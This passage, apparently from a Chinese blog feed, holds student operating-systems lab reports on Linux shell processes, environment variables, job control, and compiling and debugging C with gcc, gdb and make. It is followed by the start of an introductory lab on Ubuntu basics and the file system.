src="/posts/da9b6b33/image-20211030130949729.png" alt="image-20211030130949729"></p><p><strong>(4) 使用exit命令，中止你的子shell进程。如果再次使用exit命令，退出你的登录shell，此时，发生了什么？</strong></p><p>一次exit后回到用户，连续用两次exit后终端关闭。</p><p><strong>(5) 显示出当前进程环境中的所有变量</strong></p><p><img src="/posts/da9b6b33/image-20211030131133059.png" alt="image-20211030131133059"></p><p><strong>(6) 创建一个变量x，并将它的值赋为10,查看变量x的值,再次列出你的当前进程环境中的所有变量</strong></p><p><img src="/posts/da9b6b33/image-20211030131337702.png" alt="image-20211030131337702"></p><p>我们发现x=10出现在了环境变量中</p><p><img src="/posts/da9b6b33/image-20211030131444720.png" alt="image-20211030131444720"></p><p><strong>(7) 创建一个子shell。查看子shell中变量x的值。它的值是多少？列出子shell中所有的当前变量，有变量x吗？</strong></p><p>子shell中变量x值为空，子shell中没有变量x</p><p><img src="/posts/da9b6b33/image-20211030132032214.png" alt="image-20211030132032214"></p><p><strong>(8) 返回到父进程。将变量x的值传递给子进程。创建一个子shell，并且查看变量x的值。</strong></p><p>子shell中变量x变成了10</p><p><img src="/posts/da9b6b33/image-20211030132658588.png" alt="image-20211030132658588"></p><p><strong>(9) 在子shell中将200赋给变量x。查看变量的值是否已经改变了</strong></p><p>变成了200</p><p><img src="/posts/da9b6b33/image-20211030132753073.png" alt="image-20211030132753073"></p><p><strong>(10) 回到父进程中。查看当前环境中，变量x的值。子shell中对变量x的值的改变，上传到了父shell中吗</strong></p><p>父进程仍然为10， 子shell对变量x的改变没有上传到父shell。</p><p><img src="/posts/da9b6b33/image-20211030132838620.png" alt="image-20211030132838620"></p><p><strong>(11) 创建一个shell脚本，将其命名为sc1，它的内容应是：pwd ; cd / ; pwd</strong></p><p><img src="/posts/da9b6b33/image-20211030133043339.png" alt="image-20211030133043339"></p><p><strong>(12) 将文件sc1设置成可执行，而后运行该文件。你现在处于哪个目录中呢？为什么？</strong></p><p><img src="/posts/da9b6b33/image-20211030133355098.png" alt="image-20211030133355098"></p><p>依旧在当前目录</p><p>因为用./方式运行脚本，就相当于启动了一个子进程，在 子进程里进入了根目录，但是当前进程仍在当前目录，脚本执行完的时候子进程结束了 ，会回到当前进程，也就是回到了当前目录。</p><p><strong>(13) 创建另一个名为sc2的shell脚本。它的内容是：var1=hello;var2=$LOGNAME;export var1 var2</strong></p><p><img src="/posts/da9b6b33/image-20211030133517973.png" alt="image-20211030133517973"></p><p><strong>(14) 将文件sc2设置成可执行，而后运行该文件。运行结束后，查看变量var1与var2的值。var1与var2的值分别为多少？为什么？</strong></p><p>值为空</p><p>因为用./方式运行脚本，就相当于启动了一个子进程，在脚本里设置的环境变量只在这个子进程里有效，脚本执行完的时候子进程结束了 脚本里的环境变量以及别的变量都会消失。</p><p><img src="/posts/da9b6b33/image-20211030133653527.png" alt="image-20211030133653527"></p><p><strong>(15) 再次运行文件sc2。 此次，使用’.’命令，强迫该文件在当前shell中运行。运行结束后，查看变量var1与var2的值。现在var1与var2的值分别为多少？为什么？</strong></p><p>. sc2会强制该文件在当前shell执行，所以设置的变量仍在当前shell进程。</p><p><img src="/posts/da9b6b33/image-20211030133737229.png" alt="image-20211030133737229"></p><h4 id="2-作业控制"><a class="markdownIt-Anchor" href="#2-作业控制"></a> 2. 作业控制</h4><p><strong>(1) 在前台执行命令ls –R / &gt; outfile 2&gt; errfile</strong></p><p><img src="/posts/da9b6b33/image-20211030135325815.png" alt="image-20211030135325815"></p><p><strong>(2) 暂停这个你刚刚启动的作业</strong></p><p><img src="/posts/da9b6b33/image-20211030135339362.png" alt="image-20211030135339362"></p><p><strong>(3) 将上面暂停的作业转至后台继续运行</strong></p><p><img src="/posts/da9b6b33/image-20211030135402168.png" alt="image-20211030135402168"></p><p><strong>(4) 把这个作业转到前台来</strong></p><p><img src="/posts/da9b6b33/image-20211030135432502.png" alt="image-20211030135432502"></p><p><strong>(5) 当ls命令执行结束时，在后台重新启动它。显示出进程的ID，而后退出系统</strong></p><p><img src="/posts/da9b6b33/image-20211030140208832.png" alt="image-20211030140208832"></p><p><strong>(6) 重新登录进来，查看该后台进程是否仍在运行</strong></p><p>没有在继续执行</p><p><img src="/posts/da9b6b33/image-20211030140339679.png" alt="image-20211030140339679"></p><p><strong>(7) 创建一个包含如下内容的shell脚本文件sc3</strong></p><p><img src="/posts/da9b6b33/image-20211030142215744.png" alt="image-20211030142215744"></p><p><strong>将它置为可执行。使用nohup命令运行该文件，并将其放在后台运行（将输出重定向到sc3.out，将错误输出重定向到sc3err）。然后退出系统。</strong></p><p>用ps打印当前正在执行的进程，记下进程号，然后关闭</p><p><img src="/posts/da9b6b33/image-20211030143202728.png" alt="image-20211030143202728"></p><p><strong>(8) 再次登录进来，用top查看进程是否仍在运行</strong></p><p>用top -p 12062查看指定的sleep进程发现进程仍在运行</p><p><img src="/posts/da9b6b33/image-20211030143224175.png" alt="image-20211030143224175"></p><p><strong>(9) 进程完成后，显示输出文件outfile的内容</strong></p><p><img src="/posts/da9b6b33/image-20211030142118969.png" alt="image-20211030142118969"></p><p>文件过大，无法完全显示</p><p><img src="/posts/da9b6b33/image-20211030142054634.png" alt="image-20211030142054634"></p><h4 id="3-结束一个进程"><a class="markdownIt-Anchor" href="#3-结束一个进程"></a> 3. 结束一个进程</h4><p><strong>(1) 使用ls –R / 命令（将错误重定向，将输出重定向），在后台启动这个运行时间很长的作业。请记录该后台进程的ID号</strong></p><p><img src="/posts/da9b6b33/image-20211030144817392.png" alt="image-20211030144817392"></p><p><strong>(2) 在知道进程ID的情况下，杀死这个进程。确认你已经杀死了该进程</strong><br><img src="/posts/da9b6b33/image-20211030144834597.png" alt="image-20211030144834597"></p><h4 id="4-查看用户信息"><a class="markdownIt-Anchor" href="#4-查看用户信息"></a> 4. 查看用户信息</h4><p><strong>(1) 查看目前在系统中登录的所有用户清单</strong><br><img src="/posts/da9b6b33/image-20211030145609431.png" alt="image-20211030145609431"><br><strong>(2) 显示登陆者信息</strong><br><img src="/posts/da9b6b33/image-20211030145623590.png" alt="image-20211030145623590"></p><h2 id="实验6-c编程和调试"><a class="markdownIt-Anchor" href="#实验6-c编程和调试"></a> 实验6 C编程和调试</h2><h3 id="一-实验目的-3"><a class="markdownIt-Anchor" href="#一-实验目的-3"></a> 一、实验目的</h3><ul><li>使用户熟悉C编程工具gcc、gdb、make</li><li>熟练掌握gcc、gdb、make ，为后续项目作准备</li></ul><h3 id="二-实验要求-3"><a class="markdownIt-Anchor" href="#二-实验要求-3"></a> 二、实验要求</h3><ul><li>熟悉gcc编译四阶段，习惯gcc界面与查错，用gcc编译一个示例程序。</li><li>熟悉gdb常见调试命令，用gdb调试一个示例程序，熟悉调试环境。</li><li>熟悉make和makefile规则，通过查看一个示例程序makefile，学会用makefile管理自己的项目。</li></ul><h3 id="三-实验预备知识-3"><a class="markdownIt-Anchor" href="#三-实验预备知识-3"></a> 三、实验预备知识</h3><h4 id="1-gcc"><a class="markdownIt-Anchor" href="#1-gcc"></a> 1. Gcc</h4><p>GNU C编译器（GCC）是一个在Unix或linux等系统上运行的功能强大的编译器，主要用于对C/C++/Object C等语言的编译。</p><h5 id="1-gcc提供的各种程序以及各个头文件的位置"><a class="markdownIt-Anchor" href="#1-gcc提供的各种程序以及各个头文件的位置"></a> (1) GCC提供的各种程序以及各个头文件的位置</h5><ul><li>/usr/lib/gcc-lib/target/version/及其子目录 ，大部分的编译器都被放在这个地方 。</li><li>/usr/bin/gcc 这里装的是编译器的驱动程序。</li><li>/lib与/usr/lib 这两个目录与另外的一些目录都是本地系统的程序库目录。</li><li>/usr/include/及其子目录 这些目录下的头文件大部分都是由libe套件（libe binary package）所提供的。</li></ul><h5 id="2-gcc用法"><a class="markdownIt-Anchor" href="#2-gcc用法"></a> (2) GCC用法</h5><p>使用GCC时通常在其后面跟上一些编译选项以及要编译的文件名，以下给出的是GCC的基本用法：gcc [option] [filename]</p><h5 id="3-gcc的主要选项"><a class="markdownIt-Anchor" href="#3-gcc的主要选项"></a> (3) GCC的主要选项</h5><ul><li>-x language 指定使用的语言（c、c++或汇编）；</li><li>-c 只对文件进行编译和汇编，但不连接；</li><li>-S 只对文件进行编译，但不汇编和连接；</li><li>-E 只对文件进行预处理，但不编译、汇编和连接；</li><li>-O[file1] file2 将文件file2编译成可执行文件file1;</li><li>-l library 用来指定所使用的库文件；</li><li>-I directory 为include文件的搜索指定目录；</li><li>-W 禁止警告信息</li><li>-pedantic 严格要求符合ANSI标准；</li><li>-Wall 显示附加的警告信息。</li><li>-g 显示排错信息以用于gdb；</li><li>-p 产生prof所需的信息；</li><li>-pg 产生gprof 所使用的信息；</li></ul><h4 id="2-gdb"><a class="markdownIt-Anchor" href="#2-gdb"></a> 2. Gdb</h4><p>gdb是一个用来调试c和c++程序的功能比较强大的调试器。</p><h5 id="1-在gdb中有关调试过程中显示数据的命令有以下几条"><a class="markdownIt-Anchor" href="#1-在gdb中有关调试过程中显示数据的命令有以下几条"></a> (1) 在gdb中有关调试过程中显示数据的命令有以下几条</h5><ul><li>display命令，用来显示一些表达式的值。</li><li>info display命令，用来显示当前所有的要显示值的表达式的有关情况。</li><li>delete display命令 用来删除一个要显示值的表达式 。</li><li>disable display 使一个要显示值的表达式暂时无效，但并不删除该表达式的显示。</li><li>enable display 它与disable display命令相反，使显示值被屏蔽的表达式恢复显示 。</li><li>undisplay 这个命令用来结束某个表达式值的显示，它的功能和delete display基本一致 。</li><li>whatis 用来显示某个表达式的数据类型。</li><li>set命令 用来为变量赋值。</li></ul><h5 id="2-gdb中有关文件的命令"><a class="markdownIt-Anchor" href="#2-gdb中有关文件的命令"></a> (2) gdb中有关文件的命令</h5><ul><li>add-shared-symbol-files 用来从动态的连接映射的共享目标文件中装入符号表。</li><li>add-symbol-file 用来从已经动态装入的文件中装入符号表。</li><li>cd 用来改变当前工作目录，和shell里的cd命令是一样的。</li><li>core-file 使某个文件成为core dump，从而可以检验内存和寄存器。</li><li>directory 用来向源文件搜索路径中增加一个目录。</li><li>pwd pwd命令和shell中的pwd命令的功能是一样的，二者都是用来显示当前工作路径的。</li></ul><h5 id="3-gdb中有关程序运行的命令"><a class="markdownIt-Anchor" href="#3-gdb中有关程序运行的命令"></a> (3) gdb中有关程序运行的命令</h5><ul><li>cont cont命令和continue命令的功能是一样的，它使程序在信号发生后或是停在断点之后再继续运行。</li><li>handle 用来对信号设置处理函数。</li><li>jump 指定程序开始调试的指令或地址。</li><li>kill kill命令用来结束当前程序的调试。</li><li>next是用来继续程序的运行。</li><li>nexti 用来单步执行一条指令的。</li><li>step用来执行一条语句。</li><li>stepi 用来执行一条指令。</li></ul><h4 id="3-make"><a class="markdownIt-Anchor" href="#3-make"></a> 3. make</h4><p>make命令通过makefile文件来描述源程序之间的相互关系并自动维护编译工作。<br>make命令本身可带有四种参数：标志、宏定义、描述文件名和目标文件名。</p><p>其标准形式为：make [flags] [macro definitions] [targets]。</p><h3 id="四-实验内容-3"><a class="markdownIt-Anchor" href="#四-实验内容-3"></a> 四、实验内容</h3><h4 id="1-gcc-2"><a class="markdownIt-Anchor" href="#1-gcc-2"></a> 1. Gcc</h4><p><strong>(1) 用熟悉的编辑器输入清单1所示的代码:</strong></p><p>清单1：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//hello.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Hello world, Linux programming!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后执行下面的命令编译和运行这段程序：</p><p>$ gcc hello.c -o hello</p><p>$./hello</p><p><img src="/posts/da9b6b33/image-20211030151540494.png" alt="image-20211030151540494"><br>使用GCC编译程序时，编译过程可被细分为四个阶段 ：<br>预处理（Pre-Processing） # gcc -E hello.c -o hello.i<br>编译（Compiling） # gcc -c hello.i -o hello.o<br>汇编（Assembling）<br>链接（Linking) # gcc hello.o -o hello</p><p><strong>(2) 使用gcc发现程序错误</strong></p><p>清单2：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//illcode.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> var = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It is not standard C code!\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>当GCC在编译不符合ANSI/ISO C语言标准的源代码时，如果加上了-pedantic选项，那么使用了扩展语法的地方将产生相应的警告信息：</p><p>$ gcc -pedantic illcode.c -o illcode</p><p>illcode.c: In function ‘main’:<br>illcode.c:9: ISO C89 does not support ‘long long’<br>illcode.c:8: return type of ‘main’ is not ‘int’</p><p><img src="/posts/da9b6b33/image-20211030152031454.png" alt="image-20211030152031454"></p><h4 id="2-gdb-2"><a class="markdownIt-Anchor" href="#2-gdb-2"></a> 2. Gdb</h4><p>下面用一个实例介绍怎样用gdb调试程序。程序清单见教程。<br>用gcc编译它：gcc -g -o test test.c</p><p>程序执行时显示如下结果：<br>The string is hello there<br>The string printed backward is</p><p>输出的第一行是正确的，但第二行打印出并不是我们所期望的。my_print2 函数没有正常工作。现在，让我们用gdb看看问题究竟出在哪儿，先输入如下命令：<br>gdb greeting。</p><p>如果输入命令时忘了把要调试的程序作为参数传给gdb，可以在gdb提示符下用file命令加载它：(gdb) file greeting。这个命令加载greeting可执行文件，就像在gdb命令行里加载它一样</p><p>选择自己的test.c文件调试</p><p>-g 加入调试信息并进入调试界面：  <img src="/posts/da9b6b33/clip_image018.png" alt="img">  直接运行：  <img src="/posts/da9b6b33/clip_image020.png" alt="img">  加入断点并查看断点：  <img src="/posts/da9b6b33/clip_image022.png" alt="img">  用run执行，并用next查看下一条指令：  <img src="/posts/da9b6b33/clip_image024.png" alt="img">  用step深入函数内部：  <img src="/posts/da9b6b33/clip_image026.png" alt="img">  用list查看函数代码：  <img src="/posts/da9b6b33/clip_image028.png" alt="img">  用delete 1 删除断点并用info break重新查看断点:  <img src="/posts/da9b6b33/clip_image030.png" alt="img">  用print查看某一变量具体的值：  <img src="/posts/da9b6b33/clip_image032.png" alt="img">  用x查看某一内存地址具体的值：  <img src="/posts/da9b6b33/clip_image034.png" alt="img">  用disas反汇编某一函数：  <img src="/posts/da9b6b33/clip_image036.png" alt="img">  <img src="/posts/da9b6b33/clip_image038.png" alt="img"></p><h4 id="3-make-2"><a class="markdownIt-Anchor" href="#3-make-2"></a> 3. make</h4><p>在Linux系统中，专门提供了一个make命令来自动维护目标文件。<br>以下是一个简单的Makefile的简单例子：<br>prog:prog1.o prog2.o<br>gcc prog1.o prog2.o -o prog<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o prog1.o prog1.c<br>prog2.o:prog2.c<br>gcc -c prog2.c</p><p>测试例子</p><p>makefile</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-section">test: test1.o test2.o </span><br>gcc -Wall test1.o test2.o -o test<br>    <br><span class="hljs-section">test1.o: test1.c test2.h</span><br>gcc -c -Wall test1.c -o test1.o<br><br><span class="hljs-section">test2.o: test2.c test2.h</span><br>gcc -c -Wall test2.c -o test2.o<br><br><span class="hljs-section">clean: </span><br>    rm -rf *.o test<br><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//test1.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;test2.h&quot;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is test1!\n&quot;</span>);<br>    PrintTest2();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//test2.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;test2.h&quot;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintTest2</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is test2!\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//test2.h</span><br><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> TEST2_H_</span><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TEST2_H_</span><br> <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintTest2</span><span class="hljs-params">()</span></span>;<br><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p><img src="/posts/da9b6b33/image-20211102154641480.png" alt="image-20211102154641480"></p><p><strong>#使用缩写的Makefile</strong><br>prog:prog1.o prog2.o<br>gcc prog1.o prog2.o -o $@<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o $@ $&lt;<br>prog2.o:prog2.c<br>gcc -c $*.c</p><p><strong>#使用缩写和宏的Makefile</strong></p><p>MARCO = prog1.o prog2.o<br>prog:$(MARCO)<br>gcc prog1.o prog2.o -o $@<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o $@ $&lt;<br>prog2.o:prog2.c<br>gcc -c $*.c</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统Lab1-linux系统操作</title>
    <link href="/posts/e11b459a/"/>
    <url>/posts/e11b459a/</url>
    
    <content type="html"><![CDATA[<h2 id="实验1-linux系统安装及初级命令熟悉"><a class="markdownIt-Anchor" href="#实验1-linux系统安装及初级命令熟悉"></a> 实验1 linux系统安装及初级命令熟悉</h2><h3 id="一-实验目的"><a class="markdownIt-Anchor" href="#一-实验目的"></a> 一、实验目的</h3><ol><li>掌握Ubuntu的安装过程。</li><li>熟悉Linux命令的格式。</li><li>熟悉一些常用的命令。</li><li>熟悉如何使用帮助。</li></ol><h3 id="二-实验要求"><a class="markdownIt-Anchor" href="#二-实验要求"></a> 二、实验要求</h3><p>本次实验要求完成以下内容：</p><ul><li>用root登录进入Linux系统，创建自己的账号</li><li>执行常用的命令</li><li>使用特殊控制键，进行命令行的编辑</li><li>使用man命令，来查找特定命令的帮助信息</li></ul><h3 id="三-实验预备知识"><a class="markdownIt-Anchor" href="#三-实验预备知识"></a> 三、实验预备知识</h3><p>准备Ubuntu镜像，本次实验采用Ubuntu 20.04版本</p><h3 id="四-实验内容"><a class="markdownIt-Anchor" href="#四-实验内容"></a> 四、实验内容</h3><h4 id="1-安装linux操作系统"><a class="markdownIt-Anchor" href="#1-安装linux操作系统"></a> 1. <strong>安装linux操作系统</strong></h4><p>如图所示，Ubuntu系统已经预先安装完成。中文语言输入法均已安装。</p><h4 id="image-20211029092634926"><a class="markdownIt-Anchor" href="#image-20211029092634926"></a> <img src="/posts/e11b459a/image-20211029092634926.png" alt="image-20211029092634926"></h4><h4 id="2-基本命令"><a class="markdownIt-Anchor" href="#2-基本命令"></a> 2. <strong>基本命令</strong></h4><h5 id="1-在终端用户下为自己创建一个用户"><a class="markdownIt-Anchor" href="#1-在终端用户下为自己创建一个用户"></a> ⑴ 在终端用户下为自己创建一个用户</h5><p><img src="/posts/e11b459a/image-20211029095025375.png" alt="image-20211029095025375"></p><p><img src="/posts/e11b459a/image-20211029095100329.png" alt="image-20211029095100329"></p><h5 id="2-为yuliya用户创建一个密码"><a class="markdownIt-Anchor" href="#2-为yuliya用户创建一个密码"></a> ⑵ 为yuliya用户创建一个密码</h5><p><img src="/posts/e11b459a/image-20211029095125075.png" alt="image-20211029095125075"></p><h5 id="3-登录创建的用户"><a class="markdownIt-Anchor" href="#3-登录创建的用户"></a> ⑶ 登录创建的用户</h5><p><img src="/posts/e11b459a/image-20211029095223103.png" alt="image-20211029095223103"></p><h5 id="4-查看当前用户"><a class="markdownIt-Anchor" href="#4-查看当前用户"></a> ⑷ 查看当前用户</h5><p><img src="/posts/e11b459a/image-20211029095400878.png" alt="image-20211029095400878"></p><p><img src="/posts/e11b459a/image-20211029095241084.png" alt="image-20211029095241084"></p><h5 id="5-查明具体用户"><a class="markdownIt-Anchor" href="#5-查明具体用户"></a> ⑸ 查明具体用户</h5><p><img src="/posts/e11b459a/image-20211029095318256.png" alt="image-20211029095318256"></p><h5 id="6-退出当前用户"><a class="markdownIt-Anchor" href="#6-退出当前用户"></a> ⑹ 退出当前用户</h5><p><img src="/posts/e11b459a/image-20211029095338451.png" alt="image-20211029095338451"></p><h5 id="7-在命令行下进行关机操作"><a class="markdownIt-Anchor" href="#7-在命令行下进行关机操作"></a> ⑺ 在命令行下进行关机操作</h5><p><img src="/posts/e11b459a/image-20211029095831358.png" alt="image-20211029095831358"></p><h5 id="8-重新启动"><a class="markdownIt-Anchor" href="#8-重新启动"></a> ⑻ 重新启动</h5><p><img src="/posts/e11b459a/image-20211029102955840.png" alt="image-20211029102955840"></p><h4 id="3-特殊键的使用"><a class="markdownIt-Anchor" href="#3-特殊键的使用"></a> 3. 特殊键的使用</h4><p>回车键RETURN或者CONTROL-m或CTL-m，它表示输入行结束<br>CTL-d   它表示终端的输入结束；<br>CTL-g   控制终端响铃；<br>CTL-h   称为退格键，用于改正输入的错误；<br>CTL-i    常称作Tab键<br>DELETE键表示立即终止程序<br>BREAK键与DELETE键、CTL-c的功能</p><h4 id="4-linux下的帮助命令"><a class="markdownIt-Anchor" href="#4-linux下的帮助命令"></a> 4. linux下的帮助命令</h4><h5 id="1-man-命令"><a class="markdownIt-Anchor" href="#1-man-命令"></a> ⑴ #man 命令</h5><p><img src="/posts/e11b459a/image-20211029103608022.png" alt="image-20211029103608022"></p><p><img src="/posts/e11b459a/image-20211029103551797.png" alt="image-20211029103551797"></p><h5 id="2-help"><a class="markdownIt-Anchor" href="#2-help"></a> ⑵ #help</h5><p><img src="/posts/e11b459a/image-20211029103740702.png" alt="image-20211029103740702"></p><h5 id="3-命令-help"><a class="markdownIt-Anchor" href="#3-命令-help"></a> ⑶ #命令 --help</h5><p><img src="/posts/e11b459a/image-20211029103908087.png" alt="image-20211029103908087"></p><h4 id="5-文本编辑器"><a class="markdownIt-Anchor" href="#5-文本编辑器"></a> 5. 文本编辑器</h4><p>要在linux下编写文本或语言程序，可以选择适用vi，pico，joe，jove，mc编辑器等这样的文本模式，还可以使用像Gedit，Kate等视窗环境下的编辑器，或是使用KDevelop，它是在linux下的XWindow下执行的C/C++整合式开发环境。</p><h2 id="实验2-文件目录与操作"><a class="markdownIt-Anchor" href="#实验2-文件目录与操作"></a> 实验2 文件目录与操作</h2><h3 id="一-实验目的-2"><a class="markdownIt-Anchor" href="#一-实验目的-2"></a> 一、实验目的</h3><p>使学生熟悉目录与文件的操作</p><h3 id="二-实验要求-2"><a class="markdownIt-Anchor" href="#二-实验要求-2"></a> 二、实验要求</h3><p>本次实验要求完成下列内容：</p><ul><li>显示当前目录的目录名</li><li>改变当前目录</li><li>使用ls命令的各种选项查看文件与目录属性</li><li>创建和删除目录</li><li>创建0长度的文件</li><li>拷贝、移动、重命名及删除文件</li><li>查看文件的内容</li><li>对文件和目录进行压缩和解压缩</li></ul><h3 id="三-实验预备知识-2"><a class="markdownIt-Anchor" href="#三-实验预备知识-2"></a> 三、实验预备知识</h3><h4 id="1-什么是文件"><a class="markdownIt-Anchor" href="#1-什么是文件"></a> 1. 什么是文件</h4><p>从通常意义上来说，文件是一些数据的集合，这些数据通常是文本或机器操作码。用户所创建的大多数文件都是文本文件，而在Linux上运行的大多数程序则是机器操作码文件。每当执行一条Linux命令时，就是告诉计算机去执行某个文件或某组文件中的命令，这样的文件以半永久的形式存储在像磁盘或磁带这样的稳定介质中。</p><p>在Linux系统中，除了通常意义上的文件外，每个物理实体也都是以文件的形式出现的。Linux系统视所有文件为简单的数据字节序列，但用户或应用程序可以对文件内容附加特定的结构。</p><h4 id="2-什么是目录"><a class="markdownIt-Anchor" href="#2-什么是目录"></a> 2. 什么是目录</h4><p>目录是文件系统中的一个单元，它存放着各种文件。事实上，Linux系统中的每个文件都是包含在某个目录中的。这样的安排保持了文件的组织，并减少系统寻找某一特定文件所花的时间。</p><p>在Linux系统中，目录实际上也是一种文件。它不包含文本或可执行的机器操作码，但它具有文件名列表和有关这些文件的其它信息。</p><p>由于目录也是一种文件，因此也可以把一个目录放到另一个目录中。这有助于作为整体解释文件系统，因为系统实际上是目录和文件组成的层次结构。</p><h4 id="3-文件的命名规则"><a class="markdownIt-Anchor" href="#3-文件的命名规则"></a> 3. 文件的命名规则</h4><p>为了区别各个文件，必须给每个文件取个名字。在Linux系统中，一个合格的文件名由字母、数字和某些特殊符号组成。文件名中不应该包含空格、制表符、换行符和退格符，也不应该包含任何对shell有特定含义的字符，这些特定字符包括：`!@#$%^&amp;*()|[]{}’&quot;;&lt;&gt;/</p><h4 id="4-文件系统的层次结构"><a class="markdownIt-Anchor" href="#4-文件系统的层次结构"></a> 4. 文件系统的层次结构</h4><p>Linux的文件系统是一个包含文件和目录的层次结构，被称为目录树。目录树的最顶端只有一个目录，被称为根（root）目录。根目录以斜线字符（/）表示，由它再分支出若干其他目录和文件，。这些目录中的每一个又可能再分支出其他的一些目录和文件。下图显示了一个典型的Linux文件系统的部分结构。</p><p><img src="/posts/e11b459a/image-20211029104920799.png" alt="image-20211029104920799"></p><p>在图中，home是/的子目录，jame、john和sjp是home的子目录。相应地，/是bin、dev、lib、home和usr等的父目录，home又是jame、john和sjp的父目录。</p><h4 id="5-linux一些主要的标准目录"><a class="markdownIt-Anchor" href="#5-linux一些主要的标准目录"></a> 5. Linux一些主要的标准目录</h4><p>/bin目录保存引导系统所需要的全部可执行程序以及最常用的Linux命令。</p><p>/boot目录用来存放Linux启动时所需要的一些数据和文件。</p><p>/dev目录包含有链接硬件设备的文件。</p><p>/etc目录含用于管理Linux系统的文件和工具。</p><p>/home目录用来存放各个用户的主目录。</p><p>/lib目录含有C编译程序所需要的函数库。</p><p>/usr目录包含X Windows系统的可执行程序、函数库以及游戏等。</p><h3 id="四-实验内容-2"><a class="markdownIt-Anchor" href="#四-实验内容-2"></a> 四、实验内容</h3><h4 id="1-显示当前目录的目录名"><a class="markdownIt-Anchor" href="#1-显示当前目录的目录名"></a> 1. 显示当前目录的目录名</h4><p>使用pwd命令，确认你现在所处的目录。命令pwd可以告诉用户目前是在哪个目录中，这一命令将显示当前目录的全路径名。</p><p><img src="/posts/e11b459a/image-20211029111012656.png" alt="image-20211029111012656"></p><h4 id="2-改变当前目录"><a class="markdownIt-Anchor" href="#2-改变当前目录"></a> 2. 